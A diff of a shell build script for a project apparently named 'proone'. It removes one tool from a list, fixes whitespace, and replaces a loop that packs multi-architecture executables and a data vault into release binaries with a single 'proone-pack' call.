@@ -55,7 +55,6 @@ PROONE_BINARCH_PREFIX="$PROONE_BINARCH_DIR/binarch"
 PROONE_DVAULT="$PROONE_PREFIX/dvault.bin"
 PROONE_TOOLS="
 	proone-pack
-	proone-unpack
 	proone-list-arch
 	proone-mkdvault
 	proone-ipaddr-arr
@@ -69,7 +68,7 @@ make distclean
 set -e
 
 # native build for tools
-./configure $PROONE_AM_CONF 
+./configure $PROONE_AM_CONF
 cd src
 make -j$(nproc) $PROONE_TOOLS
 cd ..
@@ -89,29 +88,4 @@ for (( i = 0; i < ARR_SIZE; i += 1 )); do
 done
 
 # pack
-for (( i = 0; i < ARR_SIZE; i += 1 )); do
-	this_arch="${ARCH_ARR[$i]}"
-	other_archs=""
-	rel="$PROONE_REL_PREFIX.$this_arch"
-	binarch="$PROONE_BINARCH_PREFIX.$this_arch"
-
-	for (( j = 0; j < ARR_SIZE; j += 1 )); do
-		if [ $i -eq $j ]; then
-			continue
-		fi
-		other_archs="$other_archs $PROONE_EXEC_PREFIX.${ARCH_ARR[$j]}"
-	done
-
-	"$PROONE_TOOLS_DIR/proone-pack" $other_archs > "$binarch"
-	binarch_size="$(stat -c "%s" "$binarch")"
-
-	cp -a "$PROONE_EXEC_PREFIX.$this_arch" "$rel"
-	# TODO: parameterise BIN_ALIGNMENT?
-	./src/build-utils.sh align-file 8 "$rel"
-	./src/build-utils.sh append-uint16 $DVAULT_SIZE "$rel"
-	./src/build-utils.sh append-uint16 0 "$rel"
-	./src/build-utils.sh append-uint32 $binarch_size "$rel"
-	cat "$PROONE_DVAULT" >> "$rel"
-	./src/build-utils.sh align-file 8 "$rel"
-	cat "$binarch" >> "$rel"
-done
+"$PROONE_TOOLS_DIR/proone-pack" "$PROONE_REL_PREFIX" "$PROONE_DVAULT" "$PROONE_EXEC_PREFIX".*
